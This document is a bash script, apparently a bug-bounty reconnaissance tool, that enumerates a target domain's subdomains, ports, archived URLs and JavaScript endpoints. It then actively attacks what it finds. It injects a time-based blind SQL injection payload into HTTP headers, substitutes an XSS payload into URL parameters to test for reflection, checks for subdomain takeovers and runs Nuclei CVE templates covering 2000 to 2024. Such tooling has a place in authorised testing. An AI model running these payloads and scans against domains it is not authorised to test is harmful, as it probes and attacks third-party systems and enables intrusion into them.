#!/bin/bash

CYAN='\033[1;36m'
RESET='\033[0m'
GREEN='\033[0;32m'
NUCLEI_COLOR='\033[0;34m'

echo -e """${CYAN}
░█▀▀█ █░░ █▀▄▀█ ░▀░ █▀▀▀ █░░█ ▀▀█▀▀ █░░█ 
▒█▄▄█ █░░ █░▀░█ ▀█▀ █░▀█ █▀▀█ ░░█░░ █▄▄█ 
▒█░▒█ ▀▀▀ ▀░░░▀ ▀▀▀ ▀▀▀▀ ▀░░▀ ░░▀░░ ▄▄▄█${RESET}"""

echo -e "${GREEN}By Dhane Ashley Diabajo${RESET}"
echo ""

usage() {
    echo "Usage: $0 -d <target_domain> [--skip-sn] [--skip-un] [--update]"
    exit 1
}

SKIP_SN=false
SKIP_UN=false
UPDATE_SCRIPT=false

while getopts ":d:-:" opt; do
    case "${opt}" in
        d) TARGET_DOMAIN=${OPTARG} ;;
        -)
            case "${OPTARG}" in
                skip-sn) SKIP_SN=true ;;
                skip-un) SKIP_UN=true ;;
                update) UPDATE_SCRIPT=true ;;
                *) usage ;;
            esac
            ;;
        *) usage ;;
    esac
done

if [ -z "${TARGET_DOMAIN}" ]; then
    usage
fi

# Check for updates if requested
if [ "$UPDATE_SCRIPT" = true ]; then
    if [ -d ".git" ]; then
        echo -e "${CYAN}Checking for updates...${RESET}"
        git fetch origin main
        LOCAL=$(git rev-parse HEAD)
        REMOTE=$(git rev-parse origin/main)
        
        if [ "$LOCAL" != "$REMOTE" ]; then
            echo -e "${GREEN}Update available. Pulling latest version...${RESET}"
            git pull origin main
            echo -e "${CYAN}Script updated successfully! Please re-run the script.${RESET}"
            exit 0
        else
            echo -e "${CYAN}Script is already up-to-date.${RESET}"
            exit 0
        fi
    else
        echo -e "${CYAN}This script is not in a Git repository, so it cannot be updated automatically.${RESET}"
        exit 1
    fi
fi

echo -e "${GREEN}Creating Subdomain Directory${RESET}"
mkdir -p Subdomains
echo -e "${CYAN}Complete${RESET}"

echo -e "${GREEN}Running Subfinder, Anew, and Httpx...${RESET}"
echo "${TARGET_DOMAIN}" | subfinder -recursive -active -silent | anew | httpx -silent >> Subdomains/subdomains.txt
echo -e "${CYAN}Complete${RESET}"

echo -e "${GREEN}Running Httpx Scanning for sensitive files...${RESET}"
declare -a paths=("/server-status" "/phpinfo.php" "/.DS_Store" "/.git")
for path in "${paths[@]}"; do
    cat Subdomains/subdomains.txt | httpx -silent -path "$path" -mc 200 -title > "Subdomains/httpx$(basename "$path").txt"
done
echo -e "${CYAN}Task Completed!${RESET}"

echo -e "${GREEN}Running Httpx...${RESET}"
cat Subdomains/subdomains.txt | httpx -silent -sc -title -cl --tech-detect >> Subdomains/httpx-details.txt
echo -e "${CYAN}Complete${RESET}"

echo -e "${GREEN}Running Naabu...${RESET}"
cat Subdomains/subdomains.txt | naabu -v --passive -silent > Subdomains/ports.txt
echo -e "${CYAN}Task Completed!${RESET}"

echo -e "${GREEN}Running Nuclei for possible subdomain takeovers...${RESET}"
cat Subdomains/subdomains.txt | nuclei -silent -t /$HOME/nuclei-templates/http/takeovers/*.yaml > Subdomains/nuclei/nuclei-subover.txt
echo -e "${CYAN}Task Completed!${RESET}"

echo -e "${GREEN}Running Subzy and checking for subdomain takeovers...${RESET}"
subzy run --targets Subdomains/subdomains.txt >> Subdomains/subzy.txt
echo -e "${CYAN}Task Completed!${RESET}"

declare -a headers=("X-Forwarded-For" "X-Forwarded-Host" "User-Agent")
for header in "${headers[@]}"; do
    echo -e "${GREEN}Running SQLi attack using $header...${RESET}"
    cat Subdomains/subdomains.txt | httpx -silent -H "$header:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > "Subdomains/SQLi-$header.txt"
    echo -e "${CYAN}Task Completed!${RESET}"
done

source /$HOME/venv/bin/activate

echo -e "${GREEN}Running Katana${RESET}"
echo "${TARGET_DOMAIN}" | katana -silent -d 5 -ps -pss waybackarchive,commoncrawl,alienvault > urls/katana.txt
echo -e "${GREEN}Task finished${RESET}"

echo -e "${GREEN}Running GAU${RESET}"
echo "${TARGET_DOMAIN}" | gau --subs > urls/gau.txt
echo -e "${GREEN}Task finished${RESET}"

echo -e "${GREEN}Running Waybackurls...${RESET}"
waybackurls "${TARGET_DOMAIN}" > urls/waybackurls.txt
echo -e "${GREEN}Task finished${RESET}"

echo -e "${GREEN}Combining all URLs${RESET}"
cat urls/katana.txt urls/gau.txt urls/waybackurls.txt > urls/final-clean.txt
echo -e "${GREEN}Task Completed${RESET}"

echo -e "${GREEN}Checking all js files and running linkfinder...${RESET}"
mkdir -p js-files
linkfinder_path="/$HOME/LinkFinder/linkfinder.py"

cat urls/final-clean.txt | grep "\.js$" | while read -r url; do
    output=$(python3 "$linkfinder_path" -i "$url" -o cli 2>/dev/null)

    # Append to js-files/endpoints.txt if output is not empty and without specific error messages
    if [[ "$output" != *"Usage: python"* ]] && [[ "$output" != *"HTTP Error 404: Not Found"* ]] && [[ -n "$output" ]]; then
        {
            echo "$url"
            echo "$output"
            echo ""  # Add an extra space after each target host
        } >> js-files/endpoints.txt
    fi
done
echo -e "${GREEN}Task Completed${RESET}"

echo -e "${GREEN}Checking for possible XSS vulnerabilities...${RESET}"
cat urls/final-clean.txt | gf xss | qsreplace '"><img src=x onerror=alert("XSS")>' | 
while read -r host; do 
    if curl -sk --path-as-is "$host" | grep -qs '"><img src=x onerror=alert("XSS")>'; then 
        echo "$host is vulnerable" >> urls/possible-xss.txt
    fi
done

cat urls/final-clean.txt | gf sqli > urls/sqli.txt
cat urls/final-clean.txt | gf redirect | egrep -iv "wp-" > urls/open-redirect.txt
cat urls/final-clean.txt | gf ssrf > urls/ssrf.txt

# Place Nuclei logic after final-clean.txt generation
if [ "$SKIP_UN" = false ]; then
    echo -e "${GREEN}Creating URLs Nuclei directory...${RESET}"
    mkdir -p urls/nuclei
    echo -e "${CYAN}Task Completed!${RESET}"

    for i in {2000..2024}; do
        echo -e "${NUCLEI_COLOR}Running Nuclei template $i${RESET}"
        cat urls/final-clean.txt | nuclei -silent -rate-limit 200 -t /$HOME/nuclei-templates/http/cves/$i/*.yaml > urls/nuclei/nuclei-$i.txt
    done
else
    echo -e "${GREEN}Skipping Nuclei for URLs...${RESET}"
fi
echo -e "${GREEN}All tasks completed!${RESET}"
